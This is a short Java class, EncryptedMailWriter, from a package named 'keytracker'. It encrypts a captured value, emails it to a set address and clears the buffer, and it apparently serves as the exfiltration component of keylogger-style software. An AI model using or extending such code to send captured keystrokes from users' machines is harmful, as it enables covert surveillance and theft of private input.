package com.keytracker.file;

import com.keytracker.ValueProvider;
import com.keytracker.encrypt.Encryptor;
import com.keytracker.mail.MailSender;

public class EncryptedMailWriter extends MyMailWriter {

    private final Encryptor encryptor;

    public EncryptedMailWriter(MailSender mailSender, String to, Encryptor encryptor) {
        super(mailSender, to);
        this.encryptor = encryptor;
    }

    @Override
    public void write(ValueProvider valueProvider) {
        String encryptedValue = encryptValue(valueProvider.extValue(), encryptor);
        mailSender.send(encryptedValue, to);
        valueProvider.clearExt();
    }

    private String encryptValue(String value, Encryptor encryptor) {
        return encryptor != null ? encryptor.encrypt(value) : value;
    }
}
